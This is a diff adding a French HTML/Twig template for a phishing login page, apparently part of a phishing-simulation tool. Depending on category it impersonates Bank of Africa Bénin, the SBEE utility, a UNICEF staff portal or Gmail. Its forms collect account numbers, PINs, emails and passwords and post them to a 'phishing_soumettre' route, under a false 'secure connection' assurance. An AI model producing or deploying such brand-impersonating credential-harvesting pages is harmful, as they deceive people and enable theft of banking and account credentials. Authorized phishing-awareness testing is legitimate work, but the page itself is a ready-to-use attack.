@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+{# Titre dynamique selon la catégorie du gabarit #}
+{% set cat = gabarit.categorie|lower %}
+{% if 'boa' in cat %}
+    {% set theme = {
+        name: 'Bank of Africa',
+        short: 'BOA',
+        color: '#003087',
+        colorLight: '#E8F0FE',
+        colorBtn: '#003087',
+        colorBtnHover: '#001F5E',
+        logo: '🏦',
+        title: 'Connexion à votre espace client',
+        subtitle: 'Bank of Africa — Bénin',
+        fieldLabel1: 'Numéro de compte',
+        fieldName1: 'numero_compte',
+        fieldType1: 'text',
+        fieldPlaceholder1: 'Votre numéro de compte BOA',
+        fieldLabel2: 'Mot de passe',
+        fieldName2: 'password',
+        fieldType2: 'password',
+        fieldPlaceholder2: '••••••••',
+        btnLabel: 'Se connecter',
+        footer: '© 2026 Bank of Africa — Bénin. Tous droits réservés.'
+    } %}
+{% elseif 'sbee' in cat %}
+    {% set theme = {
+        name: 'SBEE',
+        short: 'SBEE',
+        color: '#E8A000',
+        colorLight: '#FFFBEB',
+        colorBtn: '#D97706',
+        colorBtnHover: '#B45309',
+        logo: '⚡',
+        title: 'Paiement de votre facture',
+        subtitle: 'Société Béninoise d\'Énergie Électrique',
+        fieldLabel1: 'Numéro d\'abonné',
+        fieldName1: 'numero_abonne',
+        fieldType1: 'text',
+        fieldPlaceholder1: 'Ex: 0123456789',
+        fieldLabel2: 'Mot de passe / Code PIN',
+        fieldName2: 'pin',
+        fieldType2: 'password',
+        fieldPlaceholder2: '••••••',
+        btnLabel: 'Accéder au paiement',
+        footer: '© 2026 SBEE — Cotonou, Bénin.'
+    } %}
+{% elseif 'unicef' in cat %}
+    {% set theme = {
+        name: 'UNICEF',
+        short: 'UNICEF',
+        color: '#1CABE2',
+        colorLight: '#E0F5FD',
+        colorBtn: '#0E86C0',
+        colorBtnHover: '#0A6A9A',
+        logo: '🌍',
+        title: 'Portail collaborateur',
+        subtitle: 'UNICEF — Système d\'information',
+        fieldLabel1: 'Adresse email professionnelle',
+        fieldName1: 'email',
+        fieldType1: 'email',
+        fieldPlaceholder1: 'prenom.nom@unicef.org',
+        fieldLabel2: 'Mot de passe',
+        fieldName2: 'password',
+        fieldType2: 'password',
+        fieldPlaceholder2: '••••••••',
+        btnLabel: 'Se connecter',
+        footer: '© 2026 UNICEF. Pour les enfants.'
+    } %}
+{% else %}
+    {# Fallback : fausse page Gmail générique #}
+    {% set theme = {
+        name: 'Google',
+        short: 'Gmail',
+        color: '#4285F4',
+        colorLight: '#EEF2FF',
+        colorBtn: '#4285F4',
+        colorBtnHover: '#2563EB',
+        logo: '📧',
+        title: 'Connexion',
+        subtitle: 'Utilisez votre compte Google',
+        fieldLabel1: 'Adresse e-mail ou numéro de téléphone',
+        fieldName1: 'email',
+        fieldType1: 'email',
+        fieldPlaceholder1: 'exemple@gmail.com',
+        fieldLabel2: 'Mot de passe',
+        fieldName2: 'password',
+        fieldType2: 'password',
+        fieldPlaceholder2: '••••••••',
+        btnLabel: 'Suivant',
+        footer: 'Français (Bénin) — Aide — Confidentialité — Conditions'
+    } %}
+{% endif %}
+
+<title>{{ theme.name }} — {{ theme.title }}</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+    font-family: 'DM Sans', 'Helvetica Neue', Arial, sans-serif;
+    background: #F8FAFC;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 24px 16px;
+    -webkit-font-smoothing: antialiased;
+}
+
+.card {
+    background: #FFFFFF;
+    border-radius: 16px;
+    box-shadow: 0 2px 20px rgba(0,0,0,0.08), 0 0 0 1px rgba(0,0,0,0.04);
+    width: 100%;
+    max-width: 400px;
+    overflow: hidden;
+}
+
+/* Barre couleur top */
+.card-bar {
+    height: 4px;
+    background: {{ theme.color }};
+}
+
+.card-body { padding: 40px 36px 32px; }
+
+/* Logo + titre */
+.logo-wrap {
+    text-align: center;
+    margin-bottom: 28px;
+}
+
+.logo-icon {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 64px;
+    height: 64px;
+    background: {{ theme.colorLight }};
+    border-radius: 16px;
+    font-size: 30px;
+    margin-bottom: 16px;
+    border: 2px solid {{ theme.color }}22;
+}
+
+.logo-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: #1E293B;
+    letter-spacing: -0.02em;
+    margin-bottom: 4px;
+}
+
+.logo-subtitle {
+    font-size: 13px;
+    color: #64748B;
+}
+
+/* Formulaire */
+.field { margin-bottom: 18px; }
+
+.field label {
+    display: block;
+    font-size: 12px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    color: #64748B;
+    margin-bottom: 6px;
+}
+
+.field input {
+    width: 100%;
+    padding: 11px 14px;
+    border: 1.5px solid #E2E8F0;
+    border-radius: 10px;
+    font-size: 14px;
+    font-family: inherit;
+    color: #1E293B;
+    background: #FAFBFC;
+    outline: none;
+    transition: border-color 0.15s, box-shadow 0.15s;
+}
+
+.field input:focus {
+    border-color: {{ theme.color }};
+    box-shadow: 0 0 0 3px {{ theme.color }}20;
+    background: #FFFFFF;
+}
+
+.forgot {
+    display: block;
+    text-align: right;
+    font-size: 12px;
+    color: {{ theme.color }};
+    text-decoration: none;
+    margin-top: -10px;
+    margin-bottom: 24px;
+}
+.forgot:hover { text-decoration: underline; }
+
+.btn-submit {
+    width: 100%;
+    padding: 13px;
+    background: {{ theme.colorBtn }};
+    color: #FFFFFF;
+    border: none;
+    border-radius: 10px;
+    font-size: 14px;
+    font-weight: 600;
+    font-family: inherit;
+    cursor: pointer;
+    transition: all 0.2s;
+    letter-spacing: -0.01em;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+}
+
+.btn-submit:hover { background: {{ theme.colorBtnHover }}; transform: translateY(-1px); }
+.btn-submit:active { transform: translateY(0); }
+
+.divider {
+    border: none;
+    border-top: 1px solid #F1F5F9;
+    margin: 24px 0;
+}
+
+.security-note {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 11px;
+    color: #94A3B8;
+    text-align: center;
+    justify-content: center;
+}
+
+.security-note svg {
+    width: 12px;
+    height: 12px;
+    flex-shrink: 0;
+    color: #10B981;
+}
+
+/* Footer */
+.footer {
+    margin-top: 20px;
+    text-align: center;
+    font-size: 11px;
+    color: #CBD5E1;
+    max-width: 400px;
+}
+
+/* Spinner lors de la soumission */
+.spinner {
+    display: none;
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: #FFFFFF;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+}
+
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="card">
+    <div class="card-bar"></div>
+    <div class="card-body">
+
+        <div class="logo-wrap">
+            <div class="logo-icon">{{ theme.logo }}</div>
+            <div class="logo-title">{{ theme.title }}</div>
+            <div class="logo-subtitle">{{ theme.subtitle }}</div>
+        </div>
+
+        <form method="post" action="{{ path('phishing_soumettre', {token: token}) }}" id="loginForm">
+
+            <div class="field">
+                <label>{{ theme.fieldLabel1 }}</label>
+                <input
+                    type="{{ theme.fieldType1 }}"
+                    name="{{ theme.fieldName1 }}"
+                    placeholder="{{ theme.fieldPlaceholder1 }}"
+                    autocomplete="username"
+                >
+            </div>
+
+            <div class="field">
+                <label>{{ theme.fieldLabel2 }}</label>
+                <input
+                    type="{{ theme.fieldType2 }}"
+                    name="{{ theme.fieldName2 }}"
+                    placeholder="{{ theme.fieldPlaceholder2 }}"
+                    autocomplete="current-password"
+                >
+            </div>
+
+            <a href="#" class="forgot">Mot de passe oublié ?</a>
+
+            <button type="submit" class="btn-submit" id="submitBtn">
+                <div class="spinner" id="spinner"></div>
+                <span id="btnText">{{ theme.btnLabel }}</span>
+            </button>
+
+        </form>
+
+        <hr class="divider">
+
+        <div class="security-note">
+            <svg viewBox="0 0 12 12" fill="none">
+                <path d="M6 1L2 3v3c0 2.5 1.7 4.8 4 5.4 2.3-.6 4-2.9 4-5.4V3L6 1z"
+                      fill="currentColor" opacity="0.8"/>
+            </svg>
+            Connexion sécurisée — Vos données sont protégées
+        </div>
+
+    </div>
+</div>
+
+<div class="footer">{{ theme.footer }}</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function() {
+    document.getElementById('spinner').style.display = 'block';
+    document.getElementById('btnText').textContent = 'Connexion...';
+    document.getElementById('submitBtn').disabled = true;
+    // Le formulaire se soumet normalement — le spinner est juste visuel
+    setTimeout(() => { this.submit(); }, 800);
+    return false; // on gère manuellement
+});
+</script>
+
+</body>
+</html>
